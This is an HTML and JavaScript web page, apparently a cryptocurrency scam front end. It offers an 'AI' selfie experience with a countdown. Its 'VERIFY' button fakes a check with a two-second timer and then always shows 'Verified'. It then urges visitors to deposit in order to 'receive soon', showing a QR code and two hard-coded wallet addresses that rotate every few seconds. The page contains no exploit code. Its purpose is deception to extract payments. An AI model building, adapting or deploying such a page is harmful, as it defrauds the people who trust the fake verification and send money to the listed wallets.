<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Selfie Mirror</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
*{box-sizing:border-box;margin:0;padding:0}
body{
  background:#f2f2f2;
  font-family:system-ui,sans-serif;
  height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
}

.center{
  text-align:center;
  width:100%;
}

/* HOME */
#home h1{
  font-size:28px;
  margin-bottom:10px;
}
#home p{
  opacity:.7;
  margin-bottom:20px;
}

/* BUTTON */
button{
  padding:14px 32px;
  border:none;
  border-radius:10px;
  background:#000;
  color:#fff;
  font-size:16px;
  letter-spacing:2px;
  cursor:pointer;
}

/* SPINNER */
.spinner{
  display:none;
  margin:20px auto;
  width:42px;
  height:42px;
  border:4px solid rgba(0,200,120,.3);
  border-top:4px solid #00c389;
  border-radius:50%;
  animation:spin 1s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}

/* STATUS */
#status{
  margin-top:16px;
  font-size:16px;
  font-weight:600;
}

/* MAIN COUNTDOWN */
#mainCountdown{
  margin-top:12px;
  font-size:18px;
  letter-spacing:2px;
}

/* QR */
.qr-box{
  display:none;
  margin-top:24px;
}
#qrImage{
  width:180px;
  background:#fff;
  padding:12px;
  border-radius:14px;
}

/* RENEW */
.renew{
  margin-top:6px;
  font-size:12px;
  letter-spacing:2px;
  opacity:.7;
}

/* DEPOSIT */
.deposit{
  display:none;
  margin-top:14px;
}
.deposit input{
  width:340px;
  padding:10px;
  text-align:center;
}
.deposit button{
  margin-top:10px;
  background:#00c389;
  color:#000;
}
#copyMsg{
  font-size:12px;
  margin-top:6px;
  opacity:0;
  transition:opacity .3s;
}
</style>
</head>

<body>

<div class="center">

  <!-- HOME -->
  <div id="home">
    <h1>2026 a pura IA</h1>
    <p>Experiencia Selfie Mirror</p>
    <button id="verifyBtn">VERIFY</button>
    <div id="mainCountdown"></div>
  </div>

  <!-- SPINNER -->
  <div class="spinner" id="spinner"></div>

  <!-- STATUS -->
  <div id="status"></div>

  <!-- QR -->
  <div class="qr-box" id="qrBox">
    <img id="qrImage" src="qr.jpeg" alt="QR Wallet">
    <div class="renew">renew in <span id="renewCounter">5</span></div>
  </div>

  <!-- DEPOSIT -->
  <div class="deposit" id="depositBox">
    <input id="addr" readonly>
    <button id="copyBtn">COPY ADDRESS</button>
    <div id="copyMsg">Copied ✓</div>
  </div>

</div>

<script>
/* ================= WALLETS ================= */
const WALLETS = [
  "0x1f62e7890d5db2c94c280547876b050f5d1816c5",
  "0xf8af1505beb8a37207eb1f019ded31dd08fc571c"
];
let currentWallet = 0;

/* ================= MAIN COUNTDOWN ================= */
const targetDate = new Date("2026-01-11T00:00:00");
const mainCountdown = document.getElementById("mainCountdown");

setInterval(()=>{
  const diff = targetDate - new Date();
  if(diff <= 0){ mainCountdown.innerText = "HOY"; return; }
  const d = Math.floor(diff/86400000);
  const h = Math.floor((diff%86400000)/3600000);
  const m = Math.floor((diff%3600000)/60000);
  mainCountdown.innerText = `${d}d ${h}h ${m}m`;
},1000);

/* ================= VERIFY ================= */
document.getElementById("verifyBtn").addEventListener("click",()=>{
  document.getElementById("home").style.display="none";
  document.getElementById("spinner").style.display="block";
  document.getElementById("status").innerText="Verificando…";

  setTimeout(()=>{
    document.getElementById("spinner").style.display="none";
    document.getElementById("status").innerText="✔ Verified";
    showDeposit();
  },2000);
});

/* ================= SHOW DEPOSIT ================= */
function showDeposit(){
  document.getElementById("status").innerText="Deposite para recibir pronto";
  document.getElementById("qrBox").style.display="block";
  document.getElementById("depositBox").style.display="block";
  updateWallet();
  startRenew();
}

/* ================= RENEW ================= */
let renew = 10;
let angle = 0;
let renewInterval;

function startRenew(){
  clearInterval(renewInterval);
  renew = 10;
  document.getElementById("renewCounter").innerText = renew;

  renewInterval = setInterval(()=>{
    renew--;
    document.getElementById("renewCounter").innerText = renew;

    if(renew === 0){
      currentWallet = (currentWallet + 1) % WALLETS.length;
      updateWallet();

      angle = (angle + 90) % 360;
      document.getElementById("qrImage").style.transform =
        `rotate(${angle}deg)`;

      renew = 5;
      document.getElementById("renewCounter").innerText = renew;
    }
  },1000);
}

function updateWallet(){
  document.getElementById("addr").value = WALLETS[currentWallet];
}

/* ================= COPY ================= */
document.getElementById("copyBtn").addEventListener("click",()=>{
  navigator.clipboard.writeText(
    document.getElementById("addr").value
  );
  const m = document.getElementById("copyMsg");
  m.style.opacity = 1;
  setTimeout(()=>m.style.opacity=0,1200);
});
</script>

</body>
</html>
